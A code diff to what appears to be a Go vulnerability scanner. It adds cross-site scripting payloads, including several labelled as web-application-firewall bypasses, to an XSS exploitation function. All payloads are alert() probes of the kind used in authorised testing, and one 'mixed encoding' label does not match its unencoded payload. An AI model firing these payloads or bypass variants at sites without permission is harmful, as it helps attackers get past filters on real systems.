@@ -310,11 +310,22 @@ type XSSResult struct {
 func (x *XSSSpecialist) exploitXSS(targetURL, parameter string) bool {
 	// Common XSS payloads for reflection testing
 	payloads := []string{
+		// Basic payloads
 		"<script>alert('XSS')</script>",
 		"<img src=x onerror=alert('XSS')>",
 		"<svg onload=alert('XSS')>",
 		"'\"><script>alert('XSS')</script>",
 		"javascript:alert('XSS')",
+		// WAF bypass variants - URL encoding
+		"%3Cscript%3Ealert('XSS')%3C/script%3E",
+		// WAF bypass - Case variation
+		"<ScRiPt>alert('XSS')</sCrIpT>",
+		// WAF bypass - Character codes
+		"<script>alert(String.fromCharCode(88,83,83))</script>",
+		// WAF bypass - Mixed encoding
+		"<img src=x onerror=alert(1)>",
+		// WAF bypass - Event handlers
+		"<body onload=alert('XSS')>",
 	}
 
 	// Parallel testing with early termination
